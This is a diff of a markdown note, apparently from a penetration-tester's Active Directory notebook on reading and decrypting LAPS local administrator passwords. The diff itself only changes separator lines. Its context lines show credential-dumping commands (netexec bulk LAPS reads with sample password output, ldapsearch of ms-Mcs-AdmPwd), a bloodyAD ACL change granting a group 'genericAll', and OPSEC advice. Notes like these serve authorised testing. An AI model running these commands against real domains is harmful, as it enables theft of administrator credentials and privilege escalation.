@@ -17,7 +17,7 @@ linked:
 ---
 # AD - LAPS Enumeration - LAPS Read & Decryption
 
-***
+---
 
 ## Bulk Read with netexec
 
@@ -39,7 +39,7 @@ nxc smb hosts.txt -u user -p pass --laps > laps_creds.txt
 # host05    LAPS    Administrator:xyz9876@@
 ```
 
-___
+---
 
 ## Single Host Read (PowerShell)
 
@@ -63,7 +63,7 @@ try {
 }
 ```
 
-___
+---
 
 ## LDAP Direct Read
 
@@ -83,7 +83,7 @@ ldapsearch -h <DC> -D 'corp\u' -w pass \
   samAccountName ms-Mcs-AdmPwd msLAPS-Password
 ```
 
-___
+---
 
 ## LAPSv2 Decryption
 
@@ -110,7 +110,7 @@ Get-GPRegistryValue -Name "<LAPS GPO>" \
 Get-ADGroupMember "<EncryptionPrincipal-group>" -Recursive
 ```
 
-___
+---
 
 ## ACL Bypass Paths
 
@@ -137,7 +137,7 @@ bloodyAD --host <DC> -d corp -u u -p pass add genericAll <victim-group> <atacant
 nxc smb <target-host> -u atacante -p pass --laps
 ```
 
-___
+---
 
 ## Cross-Correlation with Privileged Targets
 
@@ -157,7 +157,7 @@ Get-ADComputer -Filter * -Pr ms-Mcs-AdmPwd,msLAPS-Password,DistinguishedName |
   }
 ```
 
-___
+---
 
 ## OPSEC for LAPS Read
 
@@ -171,7 +171,7 @@ ___
 | Cleanup post-engagement | Document reads + force rotate | Hygiene. |
 ^ad-lapsread-opsec
 
-___
+---
 
 ## Common Read Errors
 
@@ -184,4 +184,4 @@ ___
 | `STATUS_ACCESS_DENIED` (SMB) | nxc auth issue | Check creds / try LDAP path. |
 ^ad-lapsread-errors
 
-***
+---
